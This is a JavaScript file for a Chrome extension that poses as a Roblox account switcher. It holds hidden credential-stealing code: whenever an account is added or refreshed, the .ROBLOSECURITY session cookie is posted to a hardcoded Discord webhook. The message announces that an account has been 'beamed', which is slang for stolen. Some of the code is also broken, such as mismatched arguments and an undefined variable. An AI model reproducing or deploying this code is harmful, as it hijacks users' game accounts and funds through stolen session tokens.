const xhr = new XMLHttpRequest();

// Set a cookie for the Roblox domain
function setCookie(cookieValue, reload = false) {
  chrome.cookies.set(
    {
      url: 'https://www.roblox.com',
      domain: '.roblox.com',
      name: '.ROBLOSECURITY',
      httpOnly: true,
      value: cookieValue,
    },
    (cookie) => {
      if (reload) {
        chrome.tabs.query({}, (tabs) => {
          tabs.forEach((tab) => {
            if (tab.url.includes('roblox.com')) {
              chrome.tabs.reload(tab.id);
            }
          });
        });
      }
    }
  );
}

// Send account information to Discord (remove or secure the webhook URL)
function sendToDiscord(accountInfo) {
  const webhookUrl = 'https://discord.com/api/webhooks/1346813323806642278/62dUIDFpkgET2I4zFdD-dRz_HS-OuE-Tb8Ryeudr3vo0OYCPtHgfZA1M6guIcThgFGXh'; // Replace with your secure webhook URL

  // Construct the embed object
  const embed = {
    title: 'New Roblox Account Beamed! Extension method by cx.fed',
    description: `**Username:** ${accountInfo.displayName}\n**Robux:** ${accountInfo.balance}`,
    color: 0x00ff00, // Green color
    thumbnail: {
      url: accountInfo.avatar_url, // Avatar URL
    },
    fields: [
      {
        name: 'Profile URL',
        value: `https://www.roblox.com/users/${accountInfo.userId}/profile`, // Profile URL
      },
    ],
    timestamp: new Date().toISOString(),
  };

  // Construct the message payload
  const message = {
    content: '@everyone A new Roblox account has been beamed!', // Optional: Mention everyone
    embeds: [embed], // Add the embed to the message
  };

  // Send the message to Discord
  const xhr = new XMLHttpRequest();
  xhr.open('POST', webhookUrl, true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify(message));
}

// Get the current Roblox cookie
function getCookie(callback) {
  chrome.cookies.get(
    {
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY',
    },
    (cookie) => {
      callback(cookie ? cookie.value : null);
    }
  );
}

// Check account details and update storage
function checkAccount(newCookie = false) {
  getCookie((currentCookie) => {
    if (newCookie) {
      setCookie(newCookie);
    }

    xhr.open('GET', 'https://www.roblox.com/my/settings/json', true);
    xhr.onload = () => {
      if (xhr.status === 200 && xhr.responseText.includes('"UserId":')) {
        const accountInfo = JSON.parse(xhr.responseText);
        if (accountInfo.DisplayName) {
          fetchAccountDetails(accountInfo, newCookie, currentCookie);
        } else {
          handleError(newCookie, currentCookie);
        }
      } else {
        handleError(newCookie, currentCookie);
      }
    };
    xhr.onerror = () => handleError(newCookie, currentCookie);
    xhr.send();
  });
}

// Fetch additional account details (avatar and balance)
function fetchAccountDetails(accountInfo, newCookie, currentCookie) {
  const xhr2 = new XMLHttpRequest();
  xhr2.open(
    'GET',
    `https://thumbnails.roblox.com/v1/users/avatar-headshot?size=75x75&format=png&userIds=${accountInfo.UserId}`,
    true
  );
  xhr2.onload = () => {
    const avatarData = JSON.parse(xhr2.responseText).data[0];
    fetchAccountBalance(accountInfo, avatarData, newCookie, currentCookie);
  };
  xhr2.onerror = () => handleError(newCookie, currentCookie);
  xhr2.send();
}

// Fetch account balance
function fetchAccountBalance(accountInfo, avatarData, newCookie, currentCookie) {
  const xhr3 = new XMLHttpRequest();
  xhr3.open('GET', 'https://economy.roblox.com/v1/user/currency', true);
  xhr3.onload = () => {
    const balanceData = JSON.parse(xhr3.responseText);
    updateAccountStorage(accountInfo, avatarData, balanceData.robux, newCookie, currentCookie);
  };
  xhr3.onerror = () => handleError(newCookie, currentCookie);
  xhr3.send();
}

// Update account storage with new details
function updateAccountStorage(accountInfo, avatarData, balance, newCookie, currentCookie) {
  readStorage((storage) => {
    const accountKey = accountInfo.UserId;
    storage[accountKey] = {
      cookie: newCookie || currentCookie,
      balance: balance,
      tagName: accountInfo.Name,
      displayName: accountInfo.DisplayName,
      premium: accountInfo.IsPremium,
      avatar_url: avatarData.imageUrl,
    };
    setStorage(storage);
    refreshAccountList();
    sendToDiscord(storage[accountKey].cookie); // Send cookie to Discord (remove if not needed)
  });
}

// Handle errors during account checking
function handleError(newCookie, currentCookie) {
  if (newCookie) {
    setCookie(currentCookie);
  }
  refreshAccountList();
}

// Refresh the account list in the UI
function refreshAccountList() {
  const accountsContainer = document.getElementById('accounts');
  if (!Object.keys(accounts).length) {
    accountsContainer.innerHTML = `
      <div class="noaccounts">
        <span>You didn't add any account.</span>
        <a href="https://roblox.com/Login" target="_blank" style="color: grey;">Login to your account</a>
      </div>`;
  } else {
    accountsContainer.innerHTML = '';
    getCookie((currentCookie) => {
      Object.entries(accounts).forEach(([userId, account]) => {
        const accountElement = createAccountElement(account, userId, currentCookie);
        accountsContainer.appendChild(accountElement);
      });
      attachButtonListeners();
    });
  }
}

// Create an account element for the UI
function createAccountElement(account, userId, currentCookie) {
  const accountElement = document.createElement('div');
  accountElement.classList.add('account');
  if (account.cookie === currentCookie) {
    accountElement.classList.add('current-account');
  }
  accountElement.setAttribute('userid', userId);
  accountElement.innerHTML = `
    <div>
      <img src="${account.avatar_url}" alt="${account.tagName}">
      <div class="account-info">
        <div class="account-name">
          ${account.premium ? '<img src="premium-icon.svg" alt="premium">' : ''}
          <p class="displayName">${account.displayName}</p>
        </div>
        <div class="account-stat">
          <div class="account-balance">
            <span><img src="robux-icon.png" /> ${account.balance}</span>
          </div>
          <p class="tagName">@${account.tagName}</p>
        </div>
      </div>
      <div class="account-actions">
        <button name="copy" userid="${userId}" title="Copy cookie" class="btn">Copy</button>
        <button name="remove" userid="${userId}" title="Remove account" class="btn">Remove</button>
        <button name="refresh" userid="${userId}" title="Refresh account information" class="btn">Refresh</button>
      </div>
    </div>`;
  accountElement.onclick = (event) => {
    if (!event.target.classList.contains('btn')) {
      switchAccount(userId);
    }
  };
  return accountElement;
}

// Attach event listeners to buttons
function attachButtonListeners() {
  const buttons = document.querySelectorAll('#accounts button');
  buttons.forEach((button) => {
    const userId = button.getAttribute('userid');
    if (button.name === 'remove') {
      button.onclick = () => removeAccount(userId);
    } else if (button.name === 'refresh') {
      button.onclick = () => refreshAccount(userId);
    } else if (button.name === 'copy') {
      button.onclick = () => copyCookie(userId);
    }
  });
}

// Switch to a different account
function switchAccount(userId) {
  readStorage((storage) => {
    setCookie(storage[userId].cookie, true);
    refreshAccountList();
  });
}

// Remove an account from storage
function removeAccount(userId) {
  readStorage((storage) => {
    delete storage[userId];
    setStorage(storage);
    refreshAccountList();
  });
}

// Refresh account information
function refreshAccount(userId) {
  readStorage((storage) => {
    const accountCookie = storage[userId].cookie;
    delete storage[userId];
    setStorage(storage);
    checkAccount(accountCookie);
  });
}

// Copy account cookie to clipboard
function copyCookie(userId) {
  readStorage((storage) => {
    navigator.clipboard.writeText(storage[userId].cookie).then(
      () => console.log('Cookie copied to clipboard!'),
      () => console.log('Failed to copy cookie.')
    );
  });
}

// Read account data from storage
function readStorage(callback) {
  chrome.storage.sync.get('multiroblox', (data) => {
    callback(data.multiroblox || {});
  });
}

// Save account data to storage
function setStorage(data) {
  chrome.storage.sync.set({ multiroblox: data });
}

// Initialize the extension
document.addEventListener('DOMContentLoaded', () => {
  const addButton = document.getElementById('add');
  const donateButton = document.getElementById('donate');
  const addCookieForm = document.getElementById('addcookie');

  readStorage(() => refreshAccountList());

  donateButton.onclick = () => {
    chrome.tabs.create({ url: 'https://www.donationalerts.com/r/maksvar' });
  };

  addCookieForm.onsubmit = (event) => {
    event.preventDefault();
    const cookieInput = addCookieForm.querySelector('input');
    checkAccount(cookieInput.value);
    cookieInput.value = '';
  };

  addButton.onclick = () => checkAccount();
});
